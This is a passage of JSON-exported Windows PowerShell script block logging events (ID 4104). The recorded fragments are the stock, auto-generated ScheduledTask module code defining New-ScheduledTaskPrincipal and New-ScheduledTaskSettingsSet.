    "ScriptBlockText": "= 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.RunLevelEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('NewPrincipalByUser', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'New-ScheduledTaskPrincipal' -Alias '*'\r\n        \r\n\r\nfunction New-ScheduledTaskSettingsSet\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisallowDemandStart},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisallowHardTerminate},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.CompatibilityEnum]\r\n    ${Compatibility},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${DeleteExpiredTaskAfter},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AllowStartIfOnBatteries},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Disable},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${MaintenanceExclusive},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${Hidden},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RunOnlyIfIdle},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${IdleWaitTimeout},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${NetworkId},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${NetworkName},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisallowStartOnRemoteAppSession},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${MaintenancePeriod},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${MaintenanceDeadline},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${StartWhenAvailable},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DontStopIfGoingOnBatteries},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${WakeToRun},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${IdleDuration},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RestartOnIdle},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DontStopOnIdleEnd},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${ExecutionTimeLimit},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.MultipleInstancesEnum]\r\n    ${MultipleInstances},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [int]\r\n    ${Priority},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [int]\r\n    ${RestartCount},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [timespan]\r\n    ${RestartInterval},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RunOnlyIfNetworkAvailable},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='NewSettings1')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisallowDemandStart')) {\r\n          [object]$__cmdletization_value = ${DisallowDemandStart}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowDemandStart'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowDemandStart'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisallowHardTerminate')) {\r\n          [object]$__cmdletization_value = ${DisallowHardTerminate}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowHardTerminate'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowHardTerminate'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Compatibility')) {\r\n          [object]$__cmdletization_value = ${Compatibility}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Compatibility'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.CompatibilityEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Compatibility'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.CompatibilityEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = ",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991293Z"
    },
    "EventRecordID": 31,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 8,
    "MessageTotal": 19,
    "ScriptBlockText": "$false\r\n        if ($PSBoundParameters.ContainsKey('DeleteExpiredTaskAfter')) {\r\n          [object]$__cmdletization_value = ${DeleteExpiredTaskAfter}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DeleteExpiredTaskAfter'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DeleteExpiredTaskAfter'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowStartIfOnBatteries')) {\r\n          [object]$__cmdletization_value = ${AllowStartIfOnBatteries}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowStartIfOnBatteries'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowStartIfOnBatteries'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Disable')) {\r\n          [object]$__cmdletization_value = ${Disable}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Disable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Disable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MaintenanceExclusive')) {\r\n          [object]$__cmdletization_value = ${MaintenanceExclusive}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenanceExclusive'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenanceExclusive'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Hidden')) {\r\n          [object]$__cmdletization_value = ${Hidden}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Hidden'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Hidden'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RunOnlyIfIdle')) {\r\n          [object]$__cmdletization_value = ${RunOnlyIfIdle}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunOnlyIfIdle'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RunOnlyIfIdle'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IdleWaitTimeout')) {\r\n          [object]$__cmdletization_value = ${IdleWaitTimeout}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IdleWaitTimeout'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IdleWaitTimeout'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NetworkId')) {\r\n          [object]$__cmdletization_value = ${NetworkId}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkId'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NetworkName')) {\r\n          [object]$__cmdletization_value = ${NetworkName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NetworkName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisallowStartOnRemoteAppSession')) {\r\n          [object]$__cmdletization_value = ${DisallowStartOnRemoteAppSession}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowStartOnRemoteAppSession'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisallowStartOnRemoteAppSession'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MaintenancePeriod')) {\r\n          [object]$__cmdletization_value = ${MaintenancePeriod}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenancePeriod'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenancePeriod'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MaintenanceDeadline')) {\r\n          [object]$__cmdletization_value = ${MaintenanceDeadline}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenanceDeadline'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaintenanceDeadline'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('StartWhenAvailable')) {\r\n          [object]$__cmdletization_value = ${StartWhenAvailable}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'StartWhenAvailable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Micro",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991303Z"
    },
    "EventRecordID": 32,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 9,
    "MessageTotal": 19,
    "ScriptBlockText": "soft.PowerShell.Cmdletization.MethodParameter]@{Name = 'StartWhenAvailable'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DontStopIfGoingOnBatteries')) {\r\n          [object]$__cmdletization_value = ${DontStopIfGoingOnBatteries}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DontStopIfGoingOnBatteries'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DontStopIfGoingOnBatteries'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('WakeToRun')) {\r\n          [object]$__cmdletization_value = ${WakeToRun}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WakeToRun'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'WakeToRun'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IdleDuration')) {\r\n          [object]$__cmdletization_value = ${IdleDuration}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IdleDuration'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IdleDuration'; ParameterType = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RestartOnIdle')) {\r\n          [object]$__cmdletization_value = ${RestartOnIdle}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartOnIdle'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RestartOnIdle'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DontStopOnIdleEnd')) {\r\n          [object]$__cmdletization_value = ${DontStopOnIdleEnd}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DontStopOnIdleEnd'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DontStopOnIdleEnd'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ExecutionTimeLimit')) {\r\n          